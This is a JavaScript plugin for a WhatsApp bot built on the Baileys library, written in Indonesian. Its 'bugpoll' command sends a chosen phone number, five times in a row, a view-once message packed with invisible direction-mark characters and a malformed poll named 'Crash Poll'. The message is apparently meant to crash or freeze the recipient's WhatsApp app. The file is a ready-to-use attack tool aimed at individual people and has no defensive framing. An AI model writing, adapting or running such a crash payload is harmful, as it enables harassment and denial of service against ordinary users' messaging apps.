// 📝 plugin bug - bugpoll

// ✨ Plugin bug - bugpoll ✨

const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

let handler = async (m, { conn, args, isOwner, isPremium, text, command }) => {
  if (!isOwner && !isPremium) return m.reply('❌ Fitur ini khusus untuk user premium atau owner.');

  let jidx = text?.replace(/[^0-9]/g, '');
  if (!jidx) return m.reply(`❗ Contoh penggunaan:\n.${command} 628xxxxxxx atau @taguser`);

  if (jidx.startsWith('0')) return m.reply(`❗ Nomor harus diawali dengan kode negara, bukan 0.`);

  const isTarget = `${jidx}@s.whatsapp.net`;
  await m.reply(`🚀 Mengirim polling bug ke ${isTarget}`);

  const pollingBug = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "\u200e.com\u200e.com\u200e.com\u200e.com(LTRM)\u200e.com\u200e.cm\u200e.com\u200e.com"
          },
          footer: {
            text: "\u200eLEFT-TO-RIGHT MARK\u200e.com\n\n🩸 YT: JustinOfficial-ID"
          },
          pollingMessage: {
            name: "Crash Poll",
            options: [
              { optionName: "🩸 Bug Polling", count: 999 }
            ],
            selectedOptionId: 1
          }
        }
      }
    }
  }, {});

  for (let i = 0; i < 5; i++) {
    await conn.relayMessage(isTarget, pollingBug.message, { messageId: pollingBug.key.id });
    await delay(1500);
  }

  await m.reply(`✅ Selesai mengirim polling bug ke ${isTarget}`);
};

handler.help = ['bugpoll <nomor|@tag>'];
handler.tags = ['bug'];
handler.command = ['bugpoll', 'polling', 'acara'];
handler.premium = true;
handler.owner = true;

module.exports = handler;

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}